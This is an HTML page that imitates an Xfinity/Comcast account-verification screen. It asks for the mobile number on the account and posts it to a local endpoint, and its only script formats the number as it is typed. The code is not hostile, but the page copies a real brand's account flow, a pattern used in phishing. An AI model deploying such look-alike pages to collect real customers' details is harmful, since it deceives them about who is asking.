<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity - Enter Mobile Phone Number</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #ffffff;
            color: #141414;
        }

        /* Header */
        header {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px 40px;
            border-bottom: 1px solid #e5e5e5;
            width: 100%;
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #141414;
            letter-spacing: -1px;
        }

        /* Main Container */
        main {
            flex: 1;
            display: flex;
            justify-content: flex-start;
            padding: 60px 20px 40px 10%;
        }

        .content-box {
            width: 100%;
            max-width: 520px;
        }

        .title {
            font-size: 28px;
            font-weight: 800;
            line-height: 1.25;
            color: #141414;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }

        .description {
            font-size: 14px;
            color: #616161;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .phone-input {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #767676;
            border-radius: 4px;
            background-color: #f9f9f9;
            outline: none;
            transition: border-color 0.2s, background-color 0.2s;
        }

        .phone-input:focus {
            border-color: #6125c4;
            background-color: #ffffff;
        }

        .submit-btn {
            background-color: #141414;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #333333;
        }

        /* Footer */
        footer {
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #616161;
        }

        /* Responsive Media Queries */
        @media (max-width: 768px) {
            main {
                padding: 40px 24px 20px 24px;
            }

            .title {
                font-size: 24px;
            }

            .submit-btn {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <div class="logo">xfinity</div>
    </header>

    <!-- Content -->
    <main>
        <div class="content-box">
            <h1 class="title">Enter the mobile phone number on your account</h1>
            <p class="description">
                We'll send an automated text message to this phone number with a verification code which you'll need to enter on the next step.
            </p>

            <form id="phoneForm" action="/api/verify-phone" method="POST">
                <div class="form-group">
                    <input 
                        type="tel" 
                        id="phone" 
                        name="phone" 
                        class="phone-input" 
                        placeholder="(###) ###-####" 
                        required 
                        autocomplete="tel"
                    >
                </div>

                <button type="submit" class="submit-btn">Continue</button>
            </form>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        &copy; 2026 Comcast
    </footer>

    <script>
        // Automatic phone number formatting: (###) ###-####
        const phoneInput = document.getElementById('phone');

        phoneInput.addEventListener('input', (e) => {
            let input = e.target.value.replace(/\D/g, '');
            if (input.length > 10) input = input.substring(0, 10);

            let formatted = '';
            if (input.length > 0) formatted += '(' + input.substring(0, 3);
            if (input.length >= 3) formatted += ') ';
            if (input.length > 3) formatted += input.substring(3, 6);
            if (input.length >= 6) formatted += '-';
            if (input.length > 6) formatted += input.substring(6, 10);

            e.target.value = formatted;
        });
    </script>

</body>
</html>
